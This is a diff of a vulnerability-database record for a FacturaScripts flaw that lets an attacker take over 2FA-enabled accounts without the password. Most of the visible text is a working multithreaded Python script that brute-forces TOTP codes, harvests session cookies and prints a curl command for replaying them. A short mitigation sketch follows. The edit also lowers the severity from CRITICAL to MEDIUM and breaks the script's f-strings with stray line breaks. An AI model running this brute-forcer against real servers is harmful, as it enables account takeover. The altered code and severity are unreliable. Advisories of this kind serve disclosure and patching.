@@ -1,10 +1,6 @@
-[id]
-ave_id = "AVE-2026-0293"
-aliases = ["CVE-2026-47677","GHSA-c67f-gmxw-mj93"]
-
 [basic]
-title = "FacturaScripts: Account takeover of any 2FA-enabled user"
-description = "# Authentication bypass in FacturaScripts: `/login?action=two-factor-validation` accepts brute-forceable TOTP without password or CSRF protection
+description = '''
+# Authentication bypass in FacturaScripts: `/login?action=two-factor-validation` accepts brute-forceable TOTP without password or CSRF protection
 
 ## Summary
 
@@ -100,16 +96,16 @@ random guessing finds a valid code in seconds to minutes from a single IP.
 
 ```python
 #!/usr/bin/env python3
-\"\"\"
+"""
 PoC: brute-force the 2FA endpoint.
 Required: pip install requests
-\"\"\"
+"""
 import os, sys, time, random, threading, requests
 
-BASE      = os.environ.get(\"BASE\",      \"http://localhost:9999\")
-NICK      = os.environ.get(\"NICK\",      \"admin\")
-THREADS   = int(os.environ.get(\"THREADS\",   \"32\"))
-MAX_TRIES = int(os.environ.get(\"MAX_TRIES\", \"200000\"))
+BASE      = os.environ.get("BASE",      "http://localhost:9999")
+NICK      = os.environ.get("NICK",      "admin")
+THREADS   = int(os.environ.get("THREADS",   "32"))
+MAX_TRIES = int(os.environ.get("MAX_TRIES", "200000"))
 
 hit = threading.Event()
 attempt_count = [0]
@@ -125,49 +121,51 @@ def worker(tid: int) -> None:
             if n >= MAX_TRIES:
                 return
             attempt_count[0] += 1
-        code = f\"{random.randint(0, 999999):06d}\"
+        code = f"{random.randint(0, 999999):06d}"
         try:
-            r = s.post(f\"{BASE}/login\",
-                       data={\"action\": \"two-factor-validation\",
-                             \"fsNick\":  NICK,
-                             \"fsTwoFactorCode\": code},
+            r = s.post(f"{BASE}/login",
+                       data={"action": "two-factor-validation",
+                             "fsNick":  NICK,
+                             "fsTwoFactorCode": code},
                        allow_redirects=False, timeout=5)
         except requests.RequestException:
             continue
-        sc = r.headers.get(\"Set-Cookie\", \"\")
-        if r.status_code == 302 and \"fsLogkey\" in sc:
+        sc = r.headers.get("Set-Cookie", "")
+        if r.status_code == 302 and "fsLogkey" in sc:
             with lock:
                 if hit.is_set():
                     return
                 hit.set()
-                result[\"code\"]    = code
-                result[\"n\"]       = n
-                result[\"cookies\"] = {c.name: c.value for c in r.cookies}
+                result["code"]    = code
+                result["n"]       = n
+                result["cookies"] = {c.name: c.value for c in r.cookies}
             return
 
 def main() -> int:
-    print(f\"[*] target={BASE}  nick={NICK}  threads={THREADS}\")
+    print(f"[*] target={BASE}  nick={NICK}  threads={THREADS}")
     threads = [threading.Thread(target=worker, args=(i,), daemon=True)
                for i in range(THREADS)]
     for t in threads: t.start()
     while not hit.is_set() and attempt_count[0] < MAX_TRIES:
         time.sleep(2)
         elapsed = time.time() - start
-        print(f\"  [{elapsed:5.1f}s] attempts={attempt_count[0]:>7d}  \"
-              f\"rps={attempt_count[0]/max(elapsed,1):.0f}\", flush=True)
+        print(f"  [{elapsed:5.1f}s] attempts={attempt_count[0]:>7d}  "
+              f"rps={attempt_count[0]/max(elapsed,1):.0f}", flush=True)
     for t in threads: t.join()
     elapsed = time.time() - start
     if hit.is_set():
-        print(f\"\n[+] FOUND code={result['code']} after {result['n']:,} \"
-              f\"attempts in {elapsed:.1f}s\")
-        cookie_hdr = \"; \".join(f\"{k}={v}\" for k, v in result[\"cookies\"].items())
-        print(f\"[+] Cookies: {cookie_hdr}\")
-        print(f\"\n    curl --cookie '{cookie_hdr}' {BASE}/ListUser\")
+        print(f"
+[+] FOUND code={result['code']} after {result['n']:,} "
+              f"attempts in {elapsed:.1f}s")
+        cookie_hdr = "; ".join(f"{k}={v}" for k, v in result["cookies"].items())
+        print(f"[+] Cookies: {cookie_hdr}")
+        print(f"
+    curl --cookie '{cookie_hdr}' {BASE}/ListUser")
         return 0
-    print(f\"[-] {attempt_count[0]:,} attempts in {elapsed:.1f}s, no hit\")
+    print(f"[-] {attempt_count[0]:,} attempts in {elapsed:.1f}s, no hit")
     return 1
 
-if __name__ == \"__main__\":
+if __name__ == "__main__":
     sys.exit(main())
 ```
 
@@ -216,7 +214,7 @@ one alone is insufficient.
 1. **Require evidence the user just completed the password step.** In
    `loginAction`, after `verifyPassword` succeeds and 2FA is required,
    write a short-lived nonce keyed by `(client_ip, user_nick)` to the
-   shared cache (e.g. `Cache::set(\"2fa-pending-{ip}-{nick}\", $nonce,
+   shared cache (e.g. `Cache::set("2fa-pending-{ip}-{nick}", $nonce,
    ttl=300)`). `twoFactorValidationAction` must read, validate, and
    delete that nonce before calling `verifyTwoFactorCode`. Without the
    nonce, return immediately.
@@ -293,21 +291,29 @@ Tested on a clean install built from `master` at commit `7392b489b`:
 
 # brute force (only nick known) — secret on the server can be anything
 NICK=victim THREADS=32 .venv/bin/python poc_2fa_brute.py
-```"
-severity = "CRITICAL"
-score = 5
-sources = ["ghsa"]
-published = ""
-updated = ""
+```'''
+published = "2026-01-01"
 remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "FacturaScripts: Account takeover of any 2FA-enabled user"
+updated = "2026-01-01"
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = [
+    "CVE-2026-47677",
+    "GHSA-c67f-gmxw-mj93",
+]
+ave_id = "AVE-2026-0293"
+
+[meta]
+collected_at = "2026-07-22T19:21:04.943063083+00:00"
+status = "completed"
 
 [references]
 urls = []
-
-[exploit]
-poc_urls = []
-exp_urls = []
-
-[meta]
-status = "completed"
-collected_at = "2026-07-22T19:21:04.943063083+00:00"
